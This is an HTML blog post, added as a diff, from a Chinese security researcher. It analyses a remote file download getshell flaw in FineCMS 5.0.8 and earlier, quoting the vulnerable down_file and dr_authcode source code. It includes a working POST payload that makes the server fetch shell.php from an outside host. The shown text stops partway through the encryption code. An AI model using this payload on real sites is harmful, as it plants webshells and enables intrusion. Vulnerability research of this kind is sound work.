@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞) - F0rmat&#39;s Blog">
+    <meta property="og:title" content="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞) - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞) - F0rmat&#39;s Blog">
+    <meta name="description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他">
+    <meta property="og:description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他">
+    <meta property="twitter:description" content="前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他">
+    <meta property="og:type" content="article">
+    <title>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞) - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day.html" title="通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)">通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2018-02-28 22:23:23 UTC">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 28 Feb 2018
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            2658 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            6 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#漏洞详情">漏洞详情</a>
+      <ul>
+        <li><a href="#代码位置和代码">代码位置和代码</a></li>
+        <li><a href="#执行过程">执行过程</a>
+          <ul>
+            <li><a href="#payload代码">Payload代码</a></li>
+            <li><a href="#执行结果">执行结果</a></li>
+          </ul>
+        </li>
+        <li><a href="#分析过程">分析过程</a>
+          <ul>
+            <li><a href="#构造扩展名参数">构造扩展名参数</a></li>
+            <li><a href="#构造file参数">构造file参数</a></li>
+          </ul>
+    </li>
+    <li><a href="#用python写getshell脚本">用Python写Getshell脚本</a></li>
+    <li><a href="#结束">结束</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="前言">前言</h1>
+<p>这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在<code>漏洞时代</code>又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。</p>
+<h1 id="漏洞详情">漏洞详情</h1>
+<h2 id="代码位置和代码">代码位置和代码</h2>
+<ul>
+<li>位置
+<code>\finecms\dayrui\controllers\member\Api.php</code></li>
+<li>代码</li>
+</ul>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">down_file</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//经过&amp; 分割
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$url</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$item</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$p</span><span class="p">[</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//经过 = 分割
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;游客不允许上传附件&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//对$p[&#39;code&#39;] 进行解码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">list</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nx">dr_authcode</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//得到尺寸和后缀
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">SYS_UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Ym&#39;</span><span class="p">,</span> <span class="nx">SYS_TIME</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">dr_mkdirs</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$furl</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">dr_catcher_data</span><span class="p">(</span><span class="nv">$furl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//dr_catcher_data 是读取远程文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">!</span><span class="nv">$file</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;获取远程文件失败&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$furl</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)));</span> <span class="c1">//扩展名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">!@</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fileext</span><span class="p">,</span> <span class="o">@</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;远程文件扩展名（&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="o">.</span><span class="s1">&#39;）不允许&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">999</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;file_ext&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;full_path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;file_size&#39;</span> <span class="o">=&gt;</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$fileext</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;client_name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span></code></pre></div><h2 id="执行过程">执行过程</h2>
+<h3 id="payload代码">Payload代码</h3>
+<p><code>http://finecmstest.com/index.php?s=member&amp;c=api&amp;m=down_file</code></p>
+<p>POST:url=code=d628NBt44h5NLBYyi2QIPBI37HOHqQJz/JvPubFBaG5c&amp;file=http://192.168.232.128/shell.php</p>
+<h3 id="执行结果">执行结果</h3>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down1.png" alt="finecms_down1"></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_down2.png" alt="finecms_down1"></p>
+<h2 id="分析过程">分析过程</h2>
+<p>老样子，挑重要的代码来读，跟着我的思路能读懂这段函数的流程。</p>
+<ul>
+<li><code>$p = array();</code>创建一个数组，为下面的遍历赋值所用。
+<code>$url = explode('&amp;', $this-&gt;input-&gt;post('url'));</code>接收url参数的值，<code>explode</code>这个函数就不用多说了，用于把字符串转换成数组，以<code>&amp;</code>分割为一个数组。
+<code>foreach ($url as $t) {$item = explode('=', $t);$p[$item[0]] = $item[1];}</code> 这一段遍历就是把上面的数组赋值给$p变量。
+<code>!$this-&gt;uid &amp;&amp; exit(dr_json(0,fc_lang('抱歉！游客不允许上传附件')));</code>判断是否登录</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$url</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$item</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="nv">$t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$p</span><span class="p">[</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;抱歉！游客不允许上传附件&#39;</span><span class="p">)));</span>
+</span></span></code></pre></div><ul>
+<li>这段用了<code>list</code>函数，就是把<code>explode</code>的三个值赋值给<code>$size, $ext, $path</code>, 当中用了<code>dr_authcode</code>这个函数，跟进了一下这个函数在<code>\finecms\dayrui\helpers\function_helper.php</code>里面，是一段discuz加密/解密的函数，这个函数主要看的是<code>$key = md5($key ? $key : SYS_KEY);</code>和<code>$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string . $keyb), 0, 16) . $string;$string_length = strlen($string);</code>这两句，<code>SYS_KEY</code>这个值在上一篇文章看过了，值是固定的，所以不用理会。下来一句就是如果$operation == &lsquo;DECODE&rsquo;那就解密，如果不等于DECODE那就加密。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">list</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">,</span> <span class="nv">$path</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nx">dr_authcode</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">],</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">));</span>
+</span></span></code></pre></div><p><strong>dr_authcode函数代码：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">dr_authcode</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nx">SYS_KEY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$keya</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$keyb</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span> <span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$keya</span> <span class="o">.</span> <span class="nv">$keyc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$key_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nx">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$string</span> <span class="o">.</span> <span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$string_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$box</span> <span class="o">=</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$rndkey</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$key_length</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$rndkey</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$box</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$string_length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$j</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">+</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$box</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$box</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
